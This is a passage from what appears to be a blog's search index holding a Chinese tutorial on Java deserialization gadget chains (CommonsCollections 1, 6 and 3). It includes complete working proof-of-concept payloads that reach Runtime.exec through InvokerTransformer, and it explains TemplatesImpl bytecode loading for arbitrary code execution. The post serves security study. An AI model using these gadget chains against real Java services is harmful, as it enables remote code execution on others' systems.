<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>java反序列化之CommonsCollections链</title>
    <link href="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/"/>
    <url>/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>cc1 需要 jdk7 , 其余 jdk8即可 </p><p>idea 创建 maven 项目 在pom.xml 写入。（其它包按情况自行导入，如果拉取失败到<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1">maven仓库</a>）下载导入即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>&lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">3.1</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><p>反序列化链大概和LazyMap链差不多，对不熟悉LazyMap不熟悉的师傅们可以先看这篇 <a href="https://k4d0n.top/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/">文章</a>。</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1_2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">// 结合 ChainedTransformer</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), chain);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, lazyMap);<br>        <span class="hljs-comment">// 创建LazyMap的动态代理类实例</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);<br><br>        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, mapProxy);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./cc1&quot;</span>));<br>            outputStream.writeObject(invocationHandler);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./cc1&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>前面的Transformer 是一样的不同的是从LazyMap.decorate开始，通过对sun.reflect.annotation.AnnotationInvocationHandler的动态代理，invoke是动态代理的处理器（动态代理会触发invoke函数）</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc1.png" class="" title="pc1"><p>里面调用了get方法：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc2.png" class="" title="pc2"><p>且memberValues是可控的现在就是如何实现动态代理让他自动去调用invoke方法，看invoke中怎么才能调用get方法。</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc3.png" class="" title="pc3"><p>首先这里不能调用equals方法并且调用的方法必须是一个无参的方法，不然会报错在readObject中，刚好有无参函数entrySet() 只要调用这个就会触发Invoke：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc4.png" class="" title="pc4"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc5.png" class="" title="pc5"><p>memberValues 是一个map ,我们只需要代理一个Map去调用 Invoke 方法接下来开始构造POC，先实例化一个实现了InvocationHandler接口的类实例AnnotationInvocationHandler，同时给factory赋值为lazyMap，使其能够调用get方法</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc6.png" class="" title="pc6"><p>随后通过Proxy类去代理Map了，再通过AnnotationInvocationHandler中的readObject去调用代理的Map</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc7.png" class="" title="pc7"><p>通俗理解是：反序列化 finalEvilHandler.readObject() </p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc8.png" class="" title="pc8"><p>执行到this.memberValues.entrySet()就会触发Invoke函数，如何Invoke就会调用get：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc9.png" class="" title="pc9"><p>get后面就和LazyMap链对接上了。</p><p>（说实话这条链实用性太低，还要要求jdk7 ,首选绝对不是这条链。）</p><h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p>基于：<br>commons-collections:commons-collections:3.1<br>优点：简单，不限制jdk版本</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.testlearning;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashedMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map2.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,transformerChain);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>        oos.writeObject(map2);<br>        <span class="hljs-comment">// oos.writeObject(finalEvilHandler);</span><br>        oos.flush();<br>        oos.close();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(out);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>可见前面还是和cc1相似，主要不同还是LazyMap后面的部分。LazyMap主要还要找到谁调用了get.</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc10.png" class="" title="pc10"><p>在TiedMapEntry::getvalue()调用了this.map.get() this.map可以控制</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc11.png" class="" title="pc11"><p>现在要找到谁调用了getvalue</p><p>HashMap的readObject</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc12.png" class="" title="pc12"><p>调用了hash(key)</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc13.png" class="" title="pc13"><p>找到了调用hashCode的地方</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc14.png" class="" title="pc14"><p>hashCode触发getValue（）</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc15.png" class="" title="pc15"><p>接下来我们的思路就清晰了，HashMap反序列化触发readObject()—&gt;执行hash()触发TiedMapEntry.hashCode()—&gt;执行getValue()触发LazyMap.get(“xxx”)—&gt;最终触发ChainedTransformer.transform()但是有一个问题：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc16.png" class="" title="pc16"><p>调用put函数也会调用hash,所以在序列化的时候就会触发命令，</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc17.png" class="" title="pc17"><p>只要我们修改一下</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc18.png" class="" title="pc18"><p>把原来的transformerChain去掉，等序列化完之后再通过映射设置回来</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc19.png" class="" title="pc19"><p>同时还有一个细节：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc20.png" class="" title="pc20"><p>还要把”aaa”这个key去掉，要不然hash(key)就是用”aaa” 而不是用我们的tiedMapEntry</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc21.png" class="" title="pc21"><p>成功触发：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc22.png" class="" title="pc22"><h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>这里涉及到java类加载的知识，还没了解过java类加载可以先去了解，下面自做简单的回顾</p><p>cc3这条链还是基于commons-collections 3.1 与cc1、cc5、cc6的很类似，甚至可以拼装来用。这三条链是通过InvokerTransformer反射来执行Runtime的exec, **CC3是通过动态类加载机制来实现自动执行恶意类的代码的,**所以我们还得了解一下类加载的一些知识。加载类要通过下面三个函数的调用：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc23.png" class="" title="pc23"><p>​loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass<br>​findClass 的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass<br>​defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类<br>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意 在 defineClass() 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在 defineClass() 时也无法被直接调用到。所以，如果我们要使用 defineClass() 在目标机器上执行任意代码，需要想办法调用构造函数 newInstance()。（也就是你加载类进来啥也不敢，连静态代码块都不会执行，只有初始化newInstance之后才会执行静态代码块、构造方法）</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc24.png" class="" title="pc24"><p>这里，因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。既然是我们想通过加载类来实现任意代码执行，所以就要找到一个重写了 defineClass() 方法的类，它的链上的某个类里面要调用了 newInstance()方法，才能实现任意代码执行。</p><h2 id="TemplatesImpl类加载实现任意代码执行"><a href="#TemplatesImpl类加载实现任意代码执行" class="headerlink" title="TemplatesImpl类加载实现任意代码执行"></a>TemplatesImpl类加载实现任意代码执行</h2><p>这里ysoserial找到了 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 这个类中定义了一个内部类 TransletClassLoader ，里面重写了defineClass()，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的 defineClass 由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc25.png" class="" title="pc25"><p>找一下这个类中的其它地方会调用这个方法，就找到了defineTransletClasses()方法，不过是私有的，内部会调用，接着找。并且在这里可以看到通过for循环，依次加载字节码_bytecodes中的内容，然后赋值给Class数组_class。</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc26.png" class="" title="pc26"><p>然后找到了getTransletInstance()，可以看到将字节码加载进来之后，会执行_class[_transletIndex].newInstance()，这里就会实例化类，执行任意代码了。</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc27.png" class="" title="pc27"><p>但是这个方法仍然是private的，还需要看哪里调用了getTransletInstance()。</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc28.png" class="" title="pc28"><p>调用链：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>梳理一下：newTransformer-&gt;this.getTransletInstance()</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc29.png" class="" title="pc29"><p>this.getTransletInstance()-&gt;thisdefineTransletClasses()</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc30.png" class="" title="pc30"><p>thisdefineTransletClasses()-&gt;defineclass</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc31.png" class="" title="pc31"><p>defineclass:</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc32.png" class="" title="pc32"><p>现在来写一下怎么通过这个类的newTransformer()执行任意代码，对成员变量如何赋值才能走到newInstance()：</p><p>首先在 newTransformer() 能够正常走到 getTransletInstance() ：</p><p>无限制，可以直接调用getTransletInstance（）</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc33.png" class="" title="pc33"><p>然后到 getTransletInstance() ，_name 不能为空，_class 要为空，才能进入到 defineTransletClasses()</p><img 